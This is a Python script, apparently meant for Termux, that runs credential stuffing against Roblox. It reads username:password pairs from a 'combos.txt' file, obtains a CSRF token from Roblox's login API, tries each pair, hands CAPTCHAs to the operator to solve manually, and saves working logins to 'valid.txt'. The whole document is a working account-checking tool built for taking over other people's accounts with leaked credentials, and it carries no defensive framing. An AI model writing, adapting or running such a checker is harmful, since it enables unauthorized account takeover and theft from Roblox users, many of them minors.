import os
import requests
import json

# Roblox login endpoint
login_url = 'https://auth.roblox.com/v1/login'

# Base headers
headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/json'
}

# Open CAPTCHA page in browser
def handle_captcha():
    print("\n[!] CAPTCHA or suspicious activity detected.")
    os.system("termux-open-url https://www.roblox.com/login")
    input("Press Enter once you’ve solved it manually...\n")

# Try login
def try_login(username, password):
    session = requests.Session()
    session.headers.update(headers)

    # Step 1: Get CSRF token
    get_token = session.post(login_url, json={})
    if 'x-csrf-token' not in get_token.headers:
        print("[!] Failed to get CSRF token.")
        return False

    csrf_token = get_token.headers['x-csrf-token']
    session.headers['x-csrf-token'] = csrf_token

    # Step 2: Attempt login
    payload = {
        "username": username,
        "password": password
    }

    login_res = session.post(login_url, json=payload)

    # Step 3: Handle CAPTCHA or failure
    try:
        response_data = login_res.json()
    except json.JSONDecodeError:
        print("[-] Non-JSON response. Possible block.")
        return False

    if "captcha" in login_res.text.lower() or "captchaUrl" in login_res.text.lower():
        handle_captcha()
        return False

    if login_res.status_code == 200 and 'user' in response_data:
        print(f"[+] SUCCESS: {username}:{password}")
        with open("valid.txt", "a") as f:
            f.write(f"{username}:{password}\n")
        return True

    # Show Roblox error message if available
    if 'errors' in response_data:
        print(f"[-] Failed: {username}:{password} | Reason: {response_data['errors'][0]['message']}")
    else:
        print(f"[-] Failed: {username}:{password} | Status: {login_res.status_code}")

    return False

# Read file line-by-line
def check_credentials(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if ':' not in line:
                    continue
                username, password = line.split(':', 1)
                print(f"\n[*] Trying: {username}:{password}")
                try_login(username, password)
    except FileNotFoundError:
        print(f"[!] File not found: {file_path}")

# Start
check_credentials('combos.txt')
